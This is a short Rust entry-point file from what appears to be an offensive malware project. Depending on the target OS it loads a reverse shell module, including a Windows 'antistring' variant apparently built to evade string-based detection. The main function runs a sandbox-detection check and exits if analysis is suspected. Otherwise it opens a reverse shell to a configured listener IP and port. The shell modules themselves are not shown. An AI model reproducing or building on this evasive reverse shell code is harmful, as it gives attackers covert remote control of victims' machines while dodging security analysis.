// Load Linux implementation if the target OS is Linux
#[cfg(target_os = "linux")]
mod rco_reverse_shell_linux;
#[cfg(target_os = "linux")]
use rco_reverse_shell_linux::shell;

// Load Windows implementation if the target OS is Windows
#[cfg(all(windows, not(feature = "antistring")))]
mod rco_reverse_shell_windows;
#[cfg(all(windows, not(feature = "antistring")))]
use rco_reverse_shell_windows::shell;
#[cfg(all(windows, feature = "antistring"))]
mod rco_reverse_shell_windows_antistring;
#[cfg(all(windows, feature = "antistring"))]
use rco_reverse_shell_windows_antistring::shell;

fn main() {
    // Runs the sandbox detection function or the dummy replacement, dependent on features
    if rco_utils::pound_sand() {
        return
    }

    shell(rco_config::LISTENER_IP, rco_config::LISTENER_PORT);
}
